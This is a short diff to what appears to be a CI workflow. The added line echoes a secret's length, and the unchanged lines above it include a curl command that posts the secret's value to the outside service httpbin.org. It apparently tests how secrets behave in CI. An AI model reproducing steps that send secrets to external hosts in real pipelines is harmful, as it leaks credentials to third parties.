@@ -31,6 +31,8 @@ jobs:
           curl -X POST "https://httpbin.org/post" \
             -H "Content-Type: application/json" \
             -d "{\"secret\":\"$PASS\"}"
+
+          echo "Pass length: ${#PASS}"
       
       - name: show secret length
         run: |
